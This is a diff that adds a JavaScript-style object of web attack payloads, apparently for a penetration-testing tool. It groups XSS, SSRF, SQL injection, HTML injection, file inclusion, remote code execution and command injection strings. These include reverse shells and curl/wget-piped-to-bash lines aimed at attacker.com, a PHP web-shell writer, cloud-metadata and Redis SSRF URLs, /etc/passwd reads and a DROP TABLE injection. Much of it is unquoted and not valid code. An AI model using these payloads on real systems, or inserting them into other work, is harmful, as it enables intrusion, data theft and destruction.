@@ -1,0 +1,57 @@
+let payloads = {
+    "XSS":{"Stored XSS":[<script>alert(document.cookie)</script>,
+    <img src=x onerror=alert(1)>,
+    <svg/onload=alert('XSS')>,
+    <iframe src="javascript:alert(1)"></iframe>,
+    "><script>alert('XSS')</script>
+    ],
+    "Reflected XSS":[
+        "><img src=x onerror=alert(1)>,
+    "><script>prompt('XSS')</script>,
+    "><svg/onload=confirm(1)>,
+    "><body onload=alert('XSS')>,
+    ' onfocus=alert(1) autofocus='],
+    "DOM XSS":[
+        javascript:alert('XSS'),
+        document.write('<img src=x onerror=alert(1)>');,
+        location.href="javascript:alert(1)";,
+        document.body.innerHTML = '<svg onload=alert(1)>';,
+        window.name="<svg/onload=alert(1)>"; location.href="javascript:alert(name)";
+    ]},
+    "SSRF":[
+        http://localhost:8080/admin,
+        http://169.254.169.254/latest/meta-data/,
+        http://127.0.0.1:8000,
+        file:///etc/passwd,
+        gopher://127.0.0.1:6379/_%0D%0ASET%20test%20hello%0D%0A
+    ],
+    "SQLi":[
+        ' OR 1=1--,
+        "; DROP TABLE users--,
+        admin'--,
+        admin' UNION SELECT null, version()--,
+        1' AND (SELECT sleep(5))--
+    
+    ],
+    "HTMLi":[
+        <h1>Hacked!</h1>,<script>alert('HTMLi')</script>,<ahref="javascript:alert(1)">Clickme</a>,<iframesrc="evil.com"></iframe>,<imgsrc=xonerror="alert('HTMLInjection')">
+    ],"LFI":[
+       ` ../../../../etc/passwd`,
+        ../../../../windows/system32/drivers/etc/hosts,
+        php://filter/convert.base64-encode/resource=index.php,
+        data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==,
+        /proc/self/environ
+    ],"RCE":[
+        ; nc -e /bin/sh attacker.com 4444,
+        $(curl attacker.com/rev.sh | bash),
+        echo "<?php system($_GET['cmd']); ?>" > shell.php
+        wget http://attacker.com/shell.sh -O- | bash
+        python -c 'import os; os.system("/bin/sh")'   
+    ],"CMDi":[
+        ; ls -la,
+    | cat /etc/passwd,
+    $(whoami),
+    & ping -c 4 attacker.com,
+    || nc -e /bin/bash attacker.com 1234
+    ]
+}
